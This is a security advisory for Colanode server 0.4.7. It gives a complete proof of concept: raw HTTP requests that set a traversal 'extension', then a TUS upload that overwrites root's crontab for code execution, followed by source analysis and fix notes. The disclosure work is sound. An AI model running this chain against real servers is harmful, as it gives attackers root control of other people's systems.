### Vulnerability details

**Official website / Product:** https://colanode.com / https://github.com/colanode/colanode

**Repository:** colanode/colanode (stars at selection: 5182)

**Vulnerability type:** getshell (arbitrary file write via TUS upload path traversal → root cron RCE)

**Vulnerability versions:** 0.4.7 (`ghcr.io/colanode/server:latest`; image `/config` reports version `0.4.7`, sha `d649523637f0f059c936418488165d4a689da27c`); audited tree matches that commit on `main`

**Vulnerability URL / Parameter:** `POST /client/v1/workspaces/:workspaceId/files/:fileId/tus` (TUS creation-with-upload). Attacker-controlled values: file node attributes `extension` and/or `version` set via prior `POST /client/v1/workspaces/:workspaceId/mutations` (`node.create` / `node.update`). Path template: `files/${workspaceId}/${fileId}_${version}${extension}`.

**Complex:** yes

### Verification procedure

1. Bring up the lab with the following `docker-compose.yml` (audit-time path was `labs/colanode-r17a4/compose/docker-compose.yaml`): images `ghcr.io/colanode/server:latest` + `ghcr.io/colanode/web:latest` + `pgvector/pgvector:pg17` + `valkey/valkey:8.1`. Host port maps: **19704→server:3000**, **19714→web:80**, **19715→postgres:5432**, **19716→valkey:6379**. Postgres: `colanode_user` / `postgrespass123` / DB `colanode_db`; Valkey password: `your_valkey_password`. Default file-provider storage is on the container data volume; the process runs as **root**. Account verification defaults to automatic — email register returns a token immediately.

```yaml
version: '3.8'

services:
  postgres:
    image: pgvector/pgvector:pg17
    container_name: colanode_postgres
    restart: always
    environment:
      POSTGRES_USER: colanode_user
      POSTGRES_PASSWORD: postgrespass123
      POSTGRES_DB: colanode_db
    volumes:
      - postgres_data:/var/lib/postgresql/data
    ports:
      - '19715:5432'
    networks:
      - colanode_network

  valkey:
    image: valkey/valkey:8.1
    container_name: colanode_valkey
    restart: always
    command: ['valkey-server', '--requirepass', 'your_valkey_password']
    volumes:
      - valkey_data:/data
    ports:
      - '19716:6379'
    networks:
      - colanode_network

  server:
    image: ghcr.io/colanode/server:latest
    container_name: colanode_server
    restart: always
    depends_on:
      - postgres
      - valkey
    environment:
      NODE_ENV: production
      POSTGRES_URL: postgres://colanode_user:postgrespass123@postgres:5432/colanode_db
      REDIS_URL: redis://:your_valkey_password@valkey:6379/0
    ports:
      - '19704:3000'
    volumes:
      - server_storage:/var/lib/colanode/storage
    networks:
      - colanode_network

  web:
    image: ghcr.io/colanode/web:latest
    container_name: colanode_web
    restart: always
    ports:
      - '19714:80'
    networks:
      - colanode_network

volumes:
  postgres_data:
  valkey_data:
  server_storage:

networks:
  colanode_network:
    driver: bridge
```

Start with `docker compose up -d`. Expect containers `colanode_server` / `colanode_postgres` / `colanode_valkey` / `colanode_web` Up; server listens on `127.0.0.1:19704`.

2. Register: `POST /client/v1/auth/email/register` with automatic verification (default — token returned immediately). JSON body: `{"name":"<any>","email":"<unique>","password":"<≥8 chars>"}`. Success response `type=success` includes `token` (Bearer `cnd_...`) and `workspaces[].id`. Default workspace includes a `space` node used as file `parentId` (from DB `nodes` or client sync; in this PoC: `01m6c4hcfzxw6qkfk2wdrhcjwgsp`).
3. Create a `file` node whose `extension` contains a path-traversal suffix, e.g. `/../../../../../../../../tmp/TMP-r17a4-1-afw.txt`, via `POST /client/v1/workspaces/{ws}/mutations` (`type: node.create`, CRDT state in `data.data`). Requests must include client headers: `colanode-client-type` / `colanode-client-platform` / `colanode-client-version` (e.g. `web` / `linux` / `0.4.7`). Response status `201` for that mutation.
4. Upload with TUS **creation-with-upload**: `POST /client/v1/workspaces/{ws}/files/{fileId}/tus` with `Tus-Resumable: 1.0.0`, `Upload-Length`, and body bytes. Server builds storage id from unsanitized `extension`/`version`, `@tus/file-store` uses `path.join(directory, id)` → writes **outside** the storage root.
5. Confirm AFW: `docker exec colanode_server cat /tmp/TMP-r17a4-1-afw.txt`. Expected output:

```
TMP-r17a4-1 ARBITRARY FILE WRITE via TUS extension path traversal
```

6. Getshell chain (same sink): set `extension` to `/../../../../../../../../var/spool/cron/crontabs/root`, upload cron body `* * * * * id > /tmp/colanode-r17a4-getshell.txt 2>&1\n` (ensure `crond` running in the Alpine image). Within ~1 minute, `/tmp/colanode-r17a4-getshell.txt` contains `uid=0(root)...`.

### Complete vulnerability PoC

Register example (schema from `packages/core/src/types/auth.ts`; substitute token/workspace from the response into later packets):

```http
POST /client/v1/auth/email/register HTTP/1.1
Host: 127.0.0.1:19704
Content-Type: application/json
colanode-client-type: web
colanode-client-platform: linux
colanode-client-version: 0.4.7

{"name":"r17a4","email":"r17a4@example.com","password":"Password123!"}
```

Prerequisite mutation (creates file node with traversal `extension`). `data.data` is CRDT/attribute encoding; decoded critical fields:

- `type=file`, `subtype=other`, `name`/`originalName=afw.txt`, `mimeType=text/plain`
- `parentId=01m6c4hcfzxw6qkfk2wdrhcjwgsp` (default space)
- **`extension=/../../../../../../../../tmp/TMP-r17a4-1-afw.txt`** (traversal payload)
- `version=01m6c4hcs3c49wr96bepyx85c3ve`, `status=0`, `size=130`
- `nodeId=01m6c4hcs21qpy8t444zb0k60efi`

On a fresh lab, rebuild an equivalent `node.create` with your `parentId` / generated ids (or create a normal file then `node.update` the `extension`). The packets below are the Docker-lab capture:

```http
POST /client/v1/workspaces/01m6c4hcfzxw6qkfk2wdrhcjwewc/mutations HTTP/1.1
Host: 127.0.0.1:19704
Authorization: Bearer cnd_01m6c4hcgyxhbzy4e7z2v1s9ywdeca37197285d14019ab5d65cb76cf25ebe5c9168b05c64cf3b41ebd39cdb4f27b
Content-Type: application/json
colanode-client-type: web
colanode-client-platform: linux
colanode-client-version: 0.4.7
Content-Length: 732

{"mutations": [{"id": "01m6c4hcs3c49wr96bepyx85c5mu", "type": "node.create", "createdAt": "2026-11-01T18:04:23.717Z", "data": {"nodeId": "01m6c4hcs21qpy8t444zb0k60efi", "updateId": "01m6c4hcs3c49wr96bepyx85c4ud", "createdAt": "2026-11-01T18:04:23.717Z", "data": "AQrG746GCAAoAQZvYmplY3QEdHlwZQF3BGZpbGUoAQZvYmplY3QHc3VidHlwZQF3BW90aGVyKAEGb2JqZWN0CHBhcmVudElkAXccMDFtNmM0aGNmenh3NnFrZmsyd2RyaGNqd2dzcCgBBm9iamVjdARuYW1lAXcHYWZ3LnR4dCgBBm9iamVjdAxvcmlnaW5hbE5hbWUBdwdhZncudHh0KAEGb2JqZWN0CG1pbWVUeXBlAXcKdGV4dC9wbGFpbigBBm9iamVjdAlleHRlbnNpb24BdzAvLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL1RNUC1yMTdhNC0xLWFmdy50eHQoAQZvYmplY3QEc2l6ZQF9ggEoAQZvYmplY3QHdmVyc2lvbgF3HDAxbTZjNGhjczNjNDl3cjk2YmVweXg4NWMzdmUoAQZvYmplY3QGc3RhdHVzAX0AAA=="}}]}
```

Mutation response:

```http
HTTP/1.1 200 OK
content-type: application/json; charset=utf-8

{"results":[{"id":"01m6c4hcs3c49wr96bepyx85c5mu","status":201}]}
```

Complete HTTP request — TUS write sink (Docker-verified). `Upload-Metadata`: `filename=YWZ3LnR4dA==` → `afw.txt`, `contentType=dGV4dC9wbGFpbg==` → `text/plain`:

```http
POST /client/v1/workspaces/01m6c4hcfzxw6qkfk2wdrhcjwewc/files/01m6c4hcs21qpy8t444zb0k60efi/tus HTTP/1.1
Host: 127.0.0.1:19704
Authorization: Bearer cnd_01m6c4hcgyxhbzy4e7z2v1s9ywdeca37197285d14019ab5d65cb76cf25ebe5c9168b05c64cf3b41ebd39cdb4f27b
colanode-client-type: web
colanode-client-platform: linux
colanode-client-version: 0.4.7
Tus-Resumable: 1.0.0
Upload-Length: 66
Upload-Metadata: filename YWZ3LnR4dA==,contentType dGV4dC9wbGFpbg==
Content-Type: application/offset+octet-stream
Content-Length: 66
Connection: close

TMP-r17a4-1 ARBITRARY FILE WRITE via TUS extension path traversal
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 
access-control-allow-origin: *
access-control-expose-headers: Authorization, Content-Type, Location, Tus-Extension, Tus-Max-Size, Tus-Resumable, Tus-Version, Upload-Concat, Upload-Defer-Length, Upload-Length, Upload-Metadata, Upload-Offset, X-HTTP-Method-Override, X-Requested-With, X-Forwarded-Host, X-Forwarded-Proto, Forwarded,
content-length: 43
content-type: text/plain;charset=UTF-8
tus-resumable: 1.0.0
upload-offset: 66
Date: Sun, 01 Nov 2026 18:04:55 GMT
Connection: keep-alive
Keep-Alive: timeout=72

{"uploadId":"01m6c4jbb0adae3bf5zxw59c65up"}
```

Getshell chain: same TUS sink; create/update a file node with `extension=/../../../../../../../../var/spool/cron/crontabs/root`, and set `Upload-Length` + body to (trailing newline required):

```
* * * * * id > /tmp/colanode-r17a4-getshell.txt 2>&1
```

Verification results (Docker lab):

```
=== AFW proof (Docker lab colanode_server) ===
$ docker exec colanode_server ls -la /tmp/TMP-r17a4-1-afw.txt
-rw-r--r--    1 root     root            66 Nov  1 18:04 /tmp/TMP-r17a4-1-afw.txt

$ docker exec colanode_server cat /tmp/TMP-r17a4-1-afw.txt
TMP-r17a4-1 ARBITRARY FILE WRITE via TUS extension path traversal

Uploads.path stored in DB (traversal preserved):
files/<workspaceId>/<fileId>_<version>/../../../../../../../../tmp/TMP-r17a4-1-afw.txt

=== Getshell chain (overwrite Alpine root crontab via same sink) ===
Target path constructed:
files/<ws>/<fileId>_<version>/../../../../../../../../var/spool/cron/crontabs/root

After TUS creation-with-upload:
$ docker exec colanode_server cat -A /var/spool/cron/crontabs/root
* * * * * id > /tmp/colanode-r17a4-getshell.txt 2>&1$

Cron fired (~13s):
$ docker exec colanode_server cat /tmp/colanode-r17a4-getshell.txt
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

Server image: ghcr.io/colanode/server:latest
Reported /config version: 0.4.7
Commit (image sha field): d649523637f0f059c936418488165d4a689da27c
Host port: 19704
```

### Vulnerability analysis

Colanode stores workspace files through a TUS endpoint. Before upload, clients sync a `file` node whose attributes include `extension` and `version`. Both are validated only as `z.string()` with **no** path-character denylist:

`packages/core/src/registry/nodes/file.ts` (`extension`, `version`).

The upload handler builds the object key as:

`files/${workspaceId}/${fileId}_${file.version}${file.extension}`

and passes that string to `@tus/file-store` via `namingFunction` / `getFileIdFromRequest`. `FileStore.create` then does `path.join(this.directory, file.id)` and `writeFile`, so `../` segments normalize **out of** the storage root (file-provider directory in the official image; this lab compose mounts storage on a data volume; process remains root).

TUS **creation-with-upload** (POST body on create) writes the full attacker payload in one request. Authenticated workspace editors/owners can therefore write arbitrary files as the server OS user (root in the default container). Overwriting Alpine’s `/var/spool/cron/crontabs/root` yields scheduled command execution (getshell).

This is distinct from CVE-2026-110766 (avatar **download** path traversal, read-only, forced `.jpeg` suffix).

Trigger / sink source (full path and line numbers):

```typescript
# File: apps/server/src/api/client/routes/workspaces/files/file-upload-tus.ts
# Lines: 86-91
      const path = `files/${workspaceId}/${fileId}_${file.version}${file.extension}`;
      const url = generateUrl(
        request,
        `/client/v1/workspaces/${workspaceId}/files/${fileId}/tus`
      );
```

```typescript
# File: apps/server/src/api/client/routes/workspaces/files/file-upload-tus.ts
# Lines: 234-242
        generateUrl() {
          return url;
        },
        getFileIdFromRequest() {
          return path;
        },
        namingFunction() {
          return path;
        },
```

```typescript
# File: packages/core/src/registry/nodes/file.ts
# Lines: 8-20
export const fileAttributesSchema = z.object({
  type: z.literal('file'),
  subtype: fileSubtypeSchema,
  parentId: z.string(),
  index: z.string().optional(),
  name: z.string(),
  originalName: z.string(),
  mimeType: z.string(),
  extension: z.string(),
  size: z.number(),
  version: z.string(),
  status: z.number(),
});
```

### Fix notes

- Reject `extension` / `version` / ids containing `/`, `\\`, or `..`; prefer allowlisting `^\.[A-Za-z0-9]+$` for extensions and IdType-shaped strings for version.
- After building the storage key, `path.resolve(directory, key)` and require `resolved.startsWith(path.resolve(directory) + path.sep)`.
- Run the server process as non-root and keep storage on a dedicated volume without write access to OS config paths.
